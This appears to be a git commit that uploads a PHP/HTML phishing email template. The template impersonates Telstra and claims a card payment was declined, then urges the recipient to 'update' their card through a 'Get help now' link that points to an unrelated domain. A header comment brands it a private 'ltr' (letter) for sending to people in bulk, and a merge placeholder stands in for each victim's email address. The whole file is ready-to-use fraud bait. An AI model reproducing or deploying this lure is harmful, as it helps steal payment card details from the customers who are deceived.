e07ae3a3f0fdd18240180430a9f953f6188f00d2
fiduomm <91583809+fiduomm@users.noreply.github.com>
2021-09-29 21:42:48 +0200

    Add files via upload

---
+++ lttrr.php
@@ -0,0 +1,137 @@
+<p></p>
+<!-- **************************************************************** * ___ __ __ * * / | / / / / * * / /| | / / / / * * / ___ | / /____ / / * */_/ |_|/________|/_/ * * * * * * priv8 ltr ppl codec by ALI * * fb.com/medali.prince.7 * **************************************************************** --><center>
+<table id="bodyTable" width="100%" height="100%" cellspacing="0" cellpadding="0" border="0" align="center">
+<tbody>
+<tr>
+<td id="bodyCell" valign="top" align="center"><!-- BEGIN TEMPLATE // --> <!-- [if (gte mso 9)|(IE)]>
+                        <table align="center" border="0" cellspacing="0" cellpadding="0" width="600" style="width:600px;">
+                        <tr>
+                        <td align="center" valign="top" width="600" style="width:600px;">
+                        <![endif]-->
+<table class="templateContainer" width="100%" cellspacing="0" cellpadding="0" border="0">
+<tbody>
+<tr>
+<td id="templatePreheader" valign="top">
+<table class="mcnImageBlock" style="min-width: 100%; height: 31px; width: 100%;" width="100%" cellspacing="0" cellpadding="0" border="0">
+<tbody class="mcnImageBlockOuter">
+<tr style="height: 31px;">
+<td style="padding: 9px; height: 31px;" class="mcnImageBlockInner" valign="top">&nbsp;<img src="https://observatoriodoalgarve.com/img/telstra-logo-bg.jpg" alt="" width="147" height="38" /></td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+<tr>
+<td id="templateHeader" valign="top">
+<table class="mcnTextBlock" style="min-width: 100%;" width="100%" cellspacing="0" cellpadding="0" border="0">
+<tbody class="mcnTextBlockOuter">
+<tr>
+<td class="mcnTextBlockInner" style="padding-top: 9px;" valign="top"><!-- [if mso]>
+				<table align="left" border="0" cellspacing="0" cellpadding="0" width="100%" style="width:100%;">
+				<tr>
+				<![endif]--> <!-- [if mso]>
+				<td valign="top" width="600" style="width:600px;">
+				<![endif]-->
+<table style="max-width: 100%; min-width: 100%;" class="mcnTextContentContainer" width="100%" cellspacing="0" cellpadding="0" border="0" align="left">
+<tbody>
+<tr>
+<td class="mcnTextContent" style="padding: 0 18px 9px 18px;" valign="top">
+<p class="auto-style4" style="box-sizing: border-box; color: #424242; font-size: 11px;"><strong><span class="auto-style3">Dear Customer,<span style="font-size: 14px;"><span>&nbsp;</span></span></span></strong><span style="color: #000000;"><span class="auto-style3"><span style="font-size: 18px;">[-emailuser-]</span></span><span class="auto-style3"><span style="font-size: 18px;">,</span></span></span></p>
+<p class="auto-style4" style="box-sizing: border-box; color: #424242; font-size: 11px;"><span style="font-size: 14px;">Our attempt to debit your nominated credit card for the bill on account&nbsp;</span><span style="font-size: 14px;">was unsuccessful.</span></p>
+<p class="auto-style4" style="box-sizing: border-box; color: #424242; font-size: 11px;"><span style="font-size: 14px;">the error message we received from your credit card provider was. <span class="auto-style1"><strong>Pick-up card ( code 004 ).</strong></span></span></p>
+<p class="auto-style5" style="box-sizing: border-box; font-family: Arial, Helvetica, sans-serif; text-align: left; background-color: #f4f4f4; padding: 20px; font-size: 14px; line-height: 18px; color: #414141; width: 361px; margin-top: 10px; margin-bottom: 10px;"><strong style="box-sizing: border-box;">What should i do?</strong><br style="box-sizing: border-box;" /><span style="color: #000000;">Please update your default payment card to continue your membership. Just follow the steps below:</span></p>
+</td>
+</tr>
+</tbody>
+</table>
+<!-- [if mso]>
+				</td>
+				<![endif]--> <!-- [if mso]>
+				</tr>
+				</table>
+				<![endif]--></td>
+</tr>
+</tbody>
+</table>
+<table class="mcnButtonBlock" style="min-width: 100%;" width="100%" cellspacing="0" cellpadding="0" border="0">
+<tbody class="mcnButtonBlockOuter">
+<tr>
+<td style="padding: 0 18px 18px 18px;" class="mcnButtonBlockInner" valign="top" align="left">
+<table class="mcnButtonContentContainer" style="border-collapse: separate !important; border-radius: 4px; background-color: #2baadf;" cellspacing="0" cellpadding="0" border="0">
+<tbody>
+<tr>
+<td class="mcnButtonContent" style="font-family: Arial; font-size: 16px; padding: 18px;" valign="middle" align="center"><a class="mcnButton " title=" Get help now " href="https://sinoflex.org/telestraa/" target="_blank" style="font-weight: bold; letter-spacing: normal; line-height: 100%; text-align: center; text-decoration: none; color: #ffffff;" rel="noopener"> Get help now </a></td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+<tr>
+<td id="templateBody" valign="top">
+<table class="mcnTextBlock" style="min-width: 100%;" width="100%" cellspacing="0" cellpadding="0" border="0">
+<tbody class="mcnTextBlockOuter">
+<tr>
+<td class="mcnTextBlockInner" style="padding-top: 9px;" valign="top"><!-- [if mso]>
+				<table align="left" border="0" cellspacing="0" cellpadding="0" width="100%" style="width:100%;">
+				<tr>
+				<![endif]--> <!-- [if mso]>
+				<td valign="top" width="600" style="width:600px;">
+				<![endif]-->
+<table style="max-width: 100%; min-width: 100%;" class="mcnTextContentContainer" width="100%" cellspacing="0" cellpadding="0" border="0" align="left">
+<tbody>
+<tr>
+<td class="mcnTextContent" style="padding: 0 18px 9px 18px;" valign="top">
+<p style="box-sizing: border-box; font-family: verdana, helvetica, arial; color: #424242; font-size: 11px; width: 423px;">a charge can be declined for a variety of reasons, some of which may not be related to the validity of the default payment card. In many cases you simply need to update the expiration date. For more information on why the charge may have been declined, please contact the bank that issued your card.<a href="https://tel.st/ebillbanner"></a><br />We hope that you are able to resolve this issue promptly.<br /><br />Kind regards,<span class="ecxApple-converted-space" style="box-sizing: border-box;">&nbsp;</span><br style="box-sizing: border-box;" />See you online soon,<span class="ecxApple-converted-space" style="box-sizing: border-box;">&nbsp;</span></p>
+<p style="box-sizing: border-box; font-family: verdana, helvetica, arial; color: #424242; font-size: 11px;">Telstra Digital Sales and Service</p>
+</td>
+</tr>
+</tbody>
+</table>
+<!-- [if mso]>
+				</td>
+				<![endif]--> <!-- [if mso]>
+				</tr>
+				</table>
+				<![endif]--></td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+<tr>
+<td id="templateFooter" valign="top">
+<table class="mcnDividerBlock" style="min-width: 100%;" width="100%" cellspacing="0" cellpadding="0" border="0">
+<tbody class="mcnDividerBlockOuter">
+<tr>
+<td class="mcnDividerBlockInner" style="min-width: 100%; padding: 10px 18px 25px;">
+<table class="mcnDividerContent" style="min-width: 100%; border-top: 2px solid #EEEEEE;" width="100%" cellspacing="0" cellpadding="0" border="0">
+<tbody>
+<tr>
+<td><span></span></td>
+</tr>
+</tbody>
+</table>
+<!--            
+                <td class="mcnDividerBlockInner" style="padding: 18px;">
+                <hr class="mcnDividerContent" style="border-bottom-color:none; border-left-color:none; border-right-color:none; border-bottom-width:0; border-left-width:0; border-right-width:0; margin-top:0; margin-right:0; margin-bottom:0; margin-left:0;" />
+--></td>
+</tr>
+</tbody>
+</table>
+</td>
+</tr>
+</tbody>
+</table>
+<!-- [if (gte mso 9)|(IE)]>
+                        </td>
+                        </tr>
+                        </table>
+                        <![endif]--> <!-- // END TEMPLATE --></td>
+</tr>
+</tbody>
+</table>
+</center>
